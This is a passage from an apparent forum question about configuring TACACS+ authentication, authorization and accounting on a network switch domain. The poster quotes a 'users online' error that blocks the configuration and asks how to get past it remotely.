 authentication login hwtacacs-scheme clearpass_tacacs local
 authorization login hwtacacs-scheme clearpass_tacacs local
 accounting login hwtacacs-scheme clearpass_tacacs
 accounting command hwtacacs-scheme clearpass_tacacs
 authorization command hwtacacs-scheme clearpass_tacacs

</code></pre>
<p>When I try to apply the configuration related to the ghtncb domain, I receive the following error message for each command:</p>
<p><code>There are user(s) online, can not be configured.</code></p>
<p>This prevents me from applying the necessary configuration to enable authentication, authorization, and accounting via TACACS+, forcing me to consider on-site visits, which I'm trying to avoid. Has anyone encountered this problem or has any idea on how to solve this configuration blockage due to the presence of online users? Any help or suggestion would be greatly appreciated.</p>
"